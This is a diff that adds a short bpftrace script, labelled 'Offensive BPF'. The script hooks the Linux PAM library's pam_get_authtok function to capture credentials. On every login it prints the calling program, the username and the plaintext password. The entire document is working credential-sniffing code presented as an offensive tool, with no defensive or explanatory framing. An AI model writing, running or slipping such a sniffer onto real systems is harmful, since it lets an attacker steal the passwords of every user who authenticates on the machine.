@@ -1,0 +1,29 @@
+// Partial helper struct to allow convenient casting of the user
+// See https://github.com/linux-pam/linux-pam/blob/master/libpam/pam_private.h
+struct partial_pam_handle {
+      char *filler[6];
+      char *user;
+};
+
+
+BEGIN 
+{ 
+      printf("Welcome to Offensive BPF. Sniffing PAM authentications...");
+      printf("Ctrl-C to exit.\n\n");
+}
+
+uprobe:/lib/x86_64-linux-gnu/libpam.so.0:pam_get_authtok {
+      @user[tid] = ((struct partial_pam_handle *)arg0)->user;
+      @authtok[tid] =  arg2;
+}
+    
+uretprobe:/lib/x86_64-linux-gnu/libpam.so.0:pam_get_authtok /@user[tid]/ {
+  
+      printf("Program: %s, Username: %s, AuthTok: %s\n", 
+             comm, //process
+             str(@user[tid]),  
+             str(*@authtok[tid])); 
+             
+      delete(@user[tid]);
+      delete(@authtok[tid]);
+}
